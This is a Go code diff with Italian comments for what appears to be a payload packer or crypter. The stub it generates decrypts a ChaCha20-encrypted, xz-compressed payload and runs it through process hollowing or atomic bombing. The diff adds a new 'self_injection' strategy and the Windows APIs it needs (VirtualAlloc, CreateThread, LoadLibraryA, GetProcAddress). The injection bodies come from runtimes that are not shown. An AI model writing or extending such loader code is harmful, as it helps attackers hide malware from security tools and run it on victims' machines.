@@ -9,6 +9,7 @@ import (
 const (
 	peProcessHollowingPlaceholder = "{{PROCESS_HOLLOWING_IMPL}}"
 	peAtomicBombingPlaceholder    = "{{ATOMIC_BOMBING_IMPL}}"
+	peSelfInjectionPlaceholder    = "{{SELF_INJECTION_IMPL}}"
 )
 
 // PEStubTemplate contiene il template base per lo stub PE
@@ -26,10 +27,10 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"syscall"
-	"unsafe"
-	"time"
 	"strings"
+	"syscall"
+	"time"
+	"unsafe"
 
 	"github.com/ulikunitz/xz"
 	"golang.org/x/crypto/chacha20poly1305"
@@ -48,6 +49,7 @@ var (
 	procCreateProcess    = kernel32.NewProc("CreateProcessW")
 	procVirtualAllocEx   = kernel32.NewProc("VirtualAllocEx")
 	procWriteProcessMem  = kernel32.NewProc("WriteProcessMemory")
+	procVirtualAlloc     = kernel32.NewProc("VirtualAlloc")
 	procReadProcessMem   = kernel32.NewProc("ReadProcessMemory")
 	procGetThreadCtx     = kernel32.NewProc("GetThreadContext")
 	procSetThreadCtx     = kernel32.NewProc("SetThreadContext")
@@ -62,6 +64,11 @@ var (
 	procGlobalAddAtom    = kernel32.NewProc("GlobalAddAtomW")
 	procGlobalGetAtom    = kernel32.NewProc("GlobalGetAtomNameW")
 	procGlobalDeleteAtom = kernel32.NewProc("GlobalDeleteAtom")
+	procCreateThread     = kernel32.NewProc("CreateThread")
+	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
+	procCloseHandle      = kernel32.NewProc("CloseHandle")
+	procLoadLibraryA     = kernel32.NewProc("LoadLibraryA")
+	procGetProcAddress   = kernel32.NewProc("GetProcAddress")
 
 	procRegisterClassEx  = user32.NewProc("RegisterClassExW")
 	procCreateWindowEx   = user32.NewProc("CreateWindowExW")
@@ -133,6 +140,8 @@ func main() {
 		executeProcessHollowing(payload)
 	case "atomic_bombing":
 		executeAtomicBombing(payload)
+	case "self_injection":
+		executeSelfInjection(payload)
 	case "", "off":
 		executeFromTemp(payload)
 	default:
@@ -294,6 +303,7 @@ func trimToOriginal(data []byte, originalSize uint64) []byte {
 
 ` + peProcessHollowingPlaceholder + `
 ` + peAtomicBombingPlaceholder + `
+` + peSelfInjectionPlaceholder + `
 
 // executeFromTemp esegue il payload da file temporaneo (preferibilmente nella stessa cartella dell'eseguibile impacchettato)
 func executeFromTemp(payload []byte) {
@@ -535,6 +545,7 @@ func GetPEStubSource() string {
 	replacer := strings.NewReplacer(
 		peProcessHollowingPlaceholder, winstrat.ProcessHollowingRuntime,
 		peAtomicBombingPlaceholder, winstrat.AtomicBombingRuntime,
+		peSelfInjectionPlaceholder, winstrat.SelfInjectionRuntime,
 	)
 	return replacer.Replace(PEStubSource)
 }
